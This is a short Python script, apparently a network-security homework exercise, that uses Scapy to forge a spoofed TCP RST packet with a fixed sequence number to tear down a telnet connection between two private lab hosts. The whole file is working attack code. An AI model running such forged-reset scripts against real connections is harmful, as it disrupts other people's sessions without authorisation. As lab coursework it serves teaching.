#!/usr/bin/python
# Homework 5, Task 4: Breaking TCP Connection Using Scapy

from scapy.all import *

ip = IP(src="10.0.2.4", dst="10.0.2.5")
tcp = TCP(sport=43122, dport=23, seq=2815286519, flags="R")
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)
